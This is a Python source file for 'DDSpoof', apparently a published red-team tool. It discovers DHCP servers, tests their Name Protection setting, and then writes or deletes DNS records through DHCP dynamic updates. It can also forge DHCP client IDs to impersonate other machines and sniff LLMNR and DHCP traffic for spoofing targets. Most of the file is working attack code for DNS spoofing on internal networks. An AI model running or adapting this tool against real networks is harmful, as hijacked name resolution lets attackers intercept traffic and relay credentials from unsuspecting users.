import json
import os
from typing import Dict, List, Optional

import click
from click_shell import shell
from scapy.all import get_if_addr, get_if_hwaddr

from networking.dhcp_client import DHCPClient
from networking.dhcp_dns_update_utils import (
    delete_record_by_fqdn,
    get_dhcp_lease,
    get_random_hex_string,
    test_ip_in_scope,
    test_server_name_protection_status,
    write_dns_record,
)
from networking.dhcp_server import DHCPServer
from networking.dns_client import DNSClient
from sniffers.dhcp_sniffer import DHCPSniffer
from sniffers.llmnr_sniffer import LLMNRSniffer
from spoofer_config import SpooferConfig


class DDSpoof:
    def __init__(self, verbose: bool, enum_name_protection: bool):
        self._dhcp_sniffer: Optional[DHCPSniffer] = None
        self._llmnr_sniffer: Optional[LLMNRSniffer] = None
        self._verbose = verbose
        self._enum_name_protection = enum_name_protection

    def load_config_from_file(self, config_file_path: str) -> bool:
        """
        load a config file for ddspoof
        :param config_file_path: path of config file
        :return: True if loading was successful, otherwise False
        """

        if os.path.exists(config_file_path):
            with open(config_file_path, "r") as file_obj:
                config = json.load(file_obj)
                click.echo(f"[*] Loading existing config from {config_file_path}")
                return self._apply_existing_config(config)
        else:
            click.echo(
                f"[*] Failed loading config from {config_file_path}, path not found"
            )
            return False

    def _apply_existing_config(self, loaded_config: Dict) -> bool:
        """
        apply a config loaded from a file to the current ddspoof instance
        :param loaded_config: dictionary containing ddspoof config
        :return: True if config appliance was successful, otherwise False
        """
        self._dhcp_servers = {
            server["ip_address"]: DHCPServer(**server)
            for server in loaded_config["dhcp_servers"]
        }
        loaded_config["dhcp_servers"] = self._dhcp_servers

        config = SpooferConfig(**loaded_config)
        self._iface = config.iface
        self._client_id = config.client_id
        self._requested_ip = config.requested_ip
        self._target_server = config.target_server
        self._max_retry = config.max_retry

        self._dhcp_client = DHCPClient(self._iface, self._verbose)
        self._dns_client = DNSClient(
            self._dhcp_servers[self._target_server].dns_servers, self._verbose
        )
        return True

    def initialize_new_config(self, iface: str, max_retry: int) -> bool:
        """
        initalize a ddspoof config by scanning the current network, based on the specified interface
        :param iface: Interface to use
        :param max_retry:
        :return: True if config initialization was successful, otherwise False
        """

        self._iface = iface
        self._max_retry = max_retry
        self._dhcp_client = DHCPClient(self._iface, self._verbose)
        self._client_id = get_if_hwaddr(self._iface).replace(":", "")

        # Identify reachable DHCP servers
        self._dhcp_servers = self._get_dhcp_servers_list()

        if not self._dhcp_servers:
            click.echo(f"[*] No DHCP servers identified, quitting.")
            return False

        if len(self._dhcp_servers) > 1:
            # Choose the target server from the list
            if not self._set_target_server(
                input("Enter target server IP from identified servers:")
            ):
                return False
        else:
            if not self._set_target_server(next(iter(self._dhcp_servers))):
                return False

        for dhcp_server in self._dhcp_servers.values():
            self._get_dhcp_server_data(dhcp_server)

        # Initialize the 'requested ip' setting
        click.echo(
            f"[*] Checking if current iface IP is in the target DHCP server scope..."
        )
        iface_ip = get_if_addr(self._iface)

        leased_ip = get_dhcp_lease(
            self._dhcp_client,
            iface_ip,
            self._client_id,
            self._target_server,
            self._max_retry,
            self._verbose,
        )

        if iface_ip == leased_ip:
            click.echo(
                f"[*] Current iface IP is in the target server scope and free, using it as the default requested address"
            )
            self._set_requested_ip(iface_ip)
        else:
            click.echo(f"[*] Current iface IP is taken or not in the server scope.")
            requested_ip = input("Enter default requested address:")
            self._set_requested_ip(requested_ip)

        return True

    def _get_dhcp_servers_list(self):
        """
        identify reachable DHCP servers
        :return:
        """
        click.echo(f"[*] Identifying DHCP servers...")
        dhcp_servers = self._dhcp_client.discover_dhcp_servers(
            self._client_id, self._max_retry
        )

        click.echo(f"[*] Found {len(dhcp_servers)} DHCP servers")

        for server in dhcp_servers:
            if not dhcp_servers[server].domain_name:
                click.echo(
                    f"[*] {dhcp_servers[server].ip_address}\n"
                    f"\t- Server domain name not configured. The server is most likely not a Microsoft DHCP server.\n"
                    f"\t- DNS server: {dhcp_servers[server].dns_servers}"
                )
            else:
                click.echo(
                    f"[*] {dhcp_servers[server].ip_address}\n"
                    f"\t- Server domain: {dhcp_servers[server].domain_name}\n"
                    f"\t- DNS server: {dhcp_servers[server].dns_servers}"
                )

        return dhcp_servers

    def _get_dhcp_server_data(self, dhcp_server: DHCPServer):
        """
        get additional data about a supplied DHCP server
        :param dhcp_server: DHCPServer object of the target DHCP server
        :return:
        """

        if self._enum_name_protection:
            name_protection_status = test_server_name_protection_status(
                self._dhcp_client,
                self._client_id,
                self._max_retry,
                dhcp_server,
                self._verbose,
            )
            if name_protection_status == True:
                dhcp_server.name_protection_status = True
                click.echo(f"[*] Name protection is enabled on {dhcp_server.ip_address}")
            elif name_protection_status == False:
                dhcp_server.name_protection_status = False
                click.echo(f"[*] Name protection is disabled on {dhcp_server.ip_address}")
            else:
                dhcp_server.name_protection_status = None
                click.echo(
                    f"[*] Name protection status unknown on {dhcp_server.ip_address}"
                )
        else:
            dhcp_server.name_protection_status = None
            click.echo(
                f"[*] Skipped checking Name protection status on {dhcp_server.ip_address}"
            )
            click.echo(
                f"[*] Use the '-np' flag to test Name Protection status"
            )



    def _set_target_server(self, target_server: str):
        """
        set the target server to be used by ddspoof
        :param target_server:
        :return:
        """

        if target_server not in self._dhcp_servers.keys():
            click.echo(
                f"[*] Error! Server {target_server} was not identified as a reachable DHCP server."
            )
            return False

        self._target_server = target_server
        click.echo(f"[*] Target server set to {self._target_server}")

        # Initialize the DNS client to target the DNS server of the target DHCP server
        self._dns_client = DNSClient(
            self._dhcp_servers[self._target_server].dns_servers, self._verbose
        )
        return True

    def _set_requested_ip(self, requested_ip: str):
        """
        set the requested IP address to be used by ddspoof
        :param requested_ip:
        :return:
        """
        self._requested_ip = requested_ip
        click.echo(f"[*] Requested IP set to {requested_ip}")

    def _parse_fqdn(self, fqdn: str):
        """
        parse a supplied FQDN and prepare it to be used by ddspoof
        :param fqdn:
        :return:
        """
        target_domain = self._dhcp_servers[self._target_server].domain_name

        if target_domain and not fqdn.endswith(target_domain) and "." not in fqdn:
            fqdn = f"{fqdn}.{target_domain}"
            click.echo(
                f"[*] Adding current target domain automatically. Full record name: {fqdn}"
            )
        return fqdn

    @click.command(
        help="""
Test if a given ip is in the scope of the current target server, meaning it can be used by us when spoofing.\n
If the IP is not available, prints the address offered by the server.\n
"""
    )
    @click.pass_obj
    @click.argument("ip_address")
    def test_ip(self, ip_address: str):
        if test_ip_in_scope(
            self._dhcp_client,
            ip_address,
            self._client_id,
            self._target_server,
            self._max_retry,
            self._verbose,
        ):
            click.echo(
                f"[*] The IP address {ip_address} is in the scope of the server and free to lease."
            )
        else:
            click.echo(
                f"[*] The IP address {ip_address} is out of the scope or taken. You can use the address offered by the server instead."
            )

    @click.command(
        help="""
Attempt to delete a DNS record with a specified FQDN. This can be used to delete an existing record, or cleanup our spoofed records.\n
Notes:\n
- If you attempt to delete a DNS record when Name Prrotection is enabled, you need to identify the MAC address of the target client and use it with the set-cid command\n
- You can omit the domain name and only specify the hostname, the current target domain is automatically added to the FQDN\n
"""
    )
    @click.pass_obj
    @click.argument("fqdn")
    def delete_record(self, fqdn: str):
        click.echo(f"[*] Attempting to delete DNS record for {fqdn}")

        fqdn = self._parse_fqdn(fqdn)

        if delete_record_by_fqdn(
            self._dhcp_client,
            self._dns_client,
            fqdn,
            self._client_id,
            self._target_server,
            self._max_retry,
            self._verbose,
        ):
            click.echo(f"[*] {fqdn} successfully deleted")
        else:
            click.echo(f"[*] Failed to delete {fqdn} record")

    @click.command(
        help="""
Attempt to create or modify a DNS record with a specified FQDN.\n
Notes:\n
- DDSpoof uses the IP address defined in the config by default. Overwrite this by specifying another IP address as the second argument.\n
- You can omit the domain name and only specify the hostname, the current target domain is automatically added to the FQDN.\n
"""
    )
    @click.pass_obj
    @click.argument("fqdn")
    @click.argument("requested_ip", required=False)
    def write_record(self, fqdn: str, requested_ip: str):
        click.echo(f"[*] Attempting to write DNS record for {fqdn}")
        if requested_ip is None:
            requested_ip = self._requested_ip

        fqdn = self._parse_fqdn(fqdn)

        new_record_ip = write_dns_record(
            self._dhcp_client,
            self._dns_client,
            fqdn,
            requested_ip,
            self._client_id,
            self._target_server,
            self._max_retry,
            self._verbose,
        )

        if new_record_ip:
            click.echo(
                f"[*] Spoofing was successful, new record: {fqdn} --> {new_record_ip}"
            )
        else:
            click.echo(f"[*] Spoofing record {fqdn} failed")

    @click.command(
        help="""
Set the IP address of the target DHCP server. \n
This value is automaitcally used in the Server Identifier DHCP option, causing other DHCP servers to ignore our DHCP broadcasts.\n
Notes:\n
- The IP must be of a DHCP server previously identified by DDSpoof. Run "show-config" to see available servers.\n
"""
    )
    @click.pass_obj
    @click.argument("server_ip")
    def set_server(self, server_ip: str) -> bool:
        return self._set_target_server(server_ip)

    @click.command(
        help="""
Set the IP to be requested used when sending DHCP packets. This value is automaitcally used in the _Requested IP Address_ DHCP option.\n
The server might decline to offer this IP if it's taken or out of scope.\n
    """
    )
    @click.pass_obj
    @click.argument("requested_ip")
    def set_ip(self, requested_ip: str):
        return self._set_requested_ip(requested_ip)

    @click.command(
        help="""
Set the CID to be used when sending DHCP packets. By default, this value is the MAC address of the machine.\n
Use this to impersonate other machines in the network, this can help if you attempt to manually bypass Name Protection.\n
Notes:\n
- This setting only affects the DHCP layer, the MAC address on layer 2 is not affected by it.\n
- The input value needs to be in the form of 12 hex chars. Ex: aabbccddeeff\n
- If the input value is "random", a random CID would be used.\n
"""
    )
    @click.pass_obj
    @click.argument("client_id")
    def set_cid(self, client_id: str):
        if client_id == "random":
            client_id = get_random_hex_string(12)

        elif len(client_id) != 12:
            click.echo(
                "[*] Invalid CID! please enter a CID in "
                "the form of 12 hex chars. Ex: aabbccddeeff"
            )
            return
        try:
            int(client_id, 16)
        except Exception as e:
            click.echo("[*] Invalid CID! " "Must only contain hex chars")
            return

        self._client_id = client_id
        click.echo(f"[*] Set DHCP CID to {client_id}")

    @click.command(
        help="""
This command starts the LLMNR sniffer.\n
This sniffer listens to LLMNR queries and prints FQDNs that are being looked up.\n
Notes:\n
- use the stop-llmnr command to stop the sniffer.\n
"""
    )
    @click.pass_obj
    def start_llmnr(self):
        self._llmnr_sniffer = LLMNRSniffer(
            self._iface,
            self._requested_ip,
            self._dhcp_servers[self._target_server].domain_name,
            self._target_server,
            self._client_id,
            self._verbose,
        )
        self._llmnr_sniffer.start()

    @click.command(
        help="""
This command starts the DHCP sniffer.\n
This sniffer listens to DHCP Request messages and prints information about potential spoofing targets.\n
Notes:\n
- use the stop-dhcp command to stop the sniffer.\n
"""
    )
    @click.pass_obj
    def start_dhcp(self):
        self._dhcp_sniffer = DHCPSniffer(
            self._iface,
            self._requested_ip,
            self._dhcp_servers[self._target_server].domain_name,
            self._verbose,
        )
        self._dhcp_sniffer.start()

    @click.command(help="Stop the LLMNR sniffer")
    @click.pass_obj
    def stop_llmnr(self):
        if self._llmnr_sniffer:
            self._llmnr_sniffer.stop()

    @click.command(help="Stop the DHCP sniffer")
    @click.pass_obj
    def stop_dhcp(self):
        if self._dhcp_sniffer:
            self._dhcp_sniffer.stop()

    @click.command(
        help="Print data about the current running config. This includes Identified DHCP servers, and user defined parameters.\n"
    )
    @click.pass_obj
    def show_config(self):
        config = SpooferConfig(
            self._iface,
            self._max_retry,
            self._client_id,
            self._target_server,
            self._requested_ip,
            self._dhcp_servers,
        )
        click.echo(config)

    @click.command(
        help="""
Save the current DDSpoof config to a file. This file can be loaded by new instances of DDSpoof to run with the same config.\n
Using a config file avoids re-scanning the network to identify DHCP servers each time DDSpoof is started.\n
After saving a config file, use the _-config-file_ parameter when running a new instace of DDSpoof to use the existing config.\n
"""
    )
    @click.pass_obj
    @click.argument("config_path")
    def save_config(self, config_path: str):
        try:
            config = {
                "iface": self._iface,
                "max_retry": self._max_retry,
                "client_id": self._client_id,
                "target_server": self._target_server,
                "requested_ip": self._requested_ip,
                "dhcp_servers": [
                    server.as_dict() for server in self._dhcp_servers.values()
                ],
            }

            fileObj = open(config_path, "w")
            json.dump(config, fileObj)
            fileObj.close()
            click.echo(f"[*] Current config saved to file: {config_path}")
        except Exception as e:
            click.echo("[*] Failed to save config to file!")

    @click.command()
    @click.pass_obj
    def exit(self):
        os._exit(1)

    @click.command()
    @click.pass_obj
    def quit(self):
        os._exit(1)

    def get_target_server(self):
        return self._target_server


def prompt_gen(ctx):
    return f"DDSpoof ({ctx.obj.get_target_server()})>"


@shell(prompt=prompt_gen)
@click.pass_context
@click.option("--iface", "-i", required=True, help="Name of the interface to use")
@click.option(
    "--retry", "-r",
    type=int,
    default=5,
    help="Set the max retry amount for the various functions used by the tool",
)
@click.option(
    "--config-file",
    type=str,
    default="",
    help="Path to a DDSpoof config file to load configuration from",
)
@click.option("--verbose", "-v", is_flag=True, help="Display verbose output")
@click.option("--enum-name-protection", "-np", is_flag=True, help="Test server name protection status. Note: This option will cause DDSpoof to create DNS records on the server")
def shell_init(ctx, iface: str, retry: int, config_file: str, verbose: bool, enum_name_protection: bool):
    spoofer = DDSpoof(verbose, enum_name_protection)

    if config_file:
        config_initialized = spoofer.load_config_from_file(config_file)
    else:
        config_initialized = spoofer.initialize_new_config(iface, retry)

    if not config_initialized:
        click.echo("[*] Failed initializing spoofer config. Quitting.")
        os._exit(1)

    ctx.obj = spoofer
    commands = [
        spoofer.delete_record,
        spoofer.write_record,
        spoofer.set_server,
        spoofer.set_cid,
        spoofer.set_ip,
        spoofer.start_dhcp,
        spoofer.start_llmnr,
        spoofer.stop_dhcp,
        spoofer.stop_llmnr,
        spoofer.show_config,
        spoofer.save_config,
        spoofer.exit,
        spoofer.quit,
        spoofer.test_ip,
    ]

    for command in commands:
        shell_init.add_command(command)


shell_init()
